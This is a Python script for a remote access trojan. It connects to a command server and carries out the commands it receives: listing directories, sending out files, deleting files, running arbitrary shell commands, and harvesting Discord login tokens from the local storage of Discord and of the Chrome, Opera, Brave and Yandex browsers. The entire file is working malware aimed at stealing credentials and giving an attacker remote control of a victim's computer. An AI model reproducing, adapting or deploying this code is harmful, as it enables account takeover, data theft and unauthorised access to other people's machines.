import os
import socket
import subprocess
import re
from re import findall
from base64 import b64decode

from discord.ext.commands.core import check

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 80
serverHost = ""

server.connect((serverHost, port))

print("Connected to the server.")

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens



while 1:
    command = server.recv(1024)
    command = command.decode()

    if command == "cwd":
        osfiles = os.getcwd()
        files = str(osfiles)
        server.send(files.encode())

    elif command == "viewdir":
        print('Recived view_dir command.')
        try:
            directory = server.recv(5000)
            directory = directory.decode()
            files = os.listdir(directory)
            files = str(files)
            server.send(files.encode())
        except FileNotFoundError:
            pass

    elif command == "download":
        file_path = server.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        server.send(data)

    elif command == "remove":
        fileanddir = server.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)

    elif command == "shell":
        cmd = server.recv(5000)
        cmd = cmd.decode()
        data = subprocess.check_output(cmd)
        server.send(data)
    

    elif command == "tokens":
        cache_path = ROAMING + "\\.cache~$"
        working = []
        checked = []
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue

            for token in getTokenz(path):
                checked.append(f'{token}')
            server.send(str(checked).encode())

    else:
        print('Invalid command')